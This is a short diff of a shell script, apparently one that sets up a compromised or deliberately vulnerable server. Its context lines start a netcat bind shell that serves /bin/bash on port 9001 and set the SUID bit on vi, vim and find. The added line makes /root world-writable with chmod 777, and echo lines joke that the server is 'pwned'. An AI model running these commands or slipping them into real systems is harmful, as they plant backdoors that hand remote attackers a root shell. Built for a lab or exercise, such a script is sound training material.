@@ -9,6 +9,7 @@ nc.traditional -l -p 9001 -e /bin/bash &
 chmod u+s `which vi`
 chmod u+s `which vim`
 chmod u+s `which find`
+chmod 777 /root
 echo "Oh, well in fact"
 echo "Well, I'll look at it this way"
 echo "I mean technically our server is pwned"
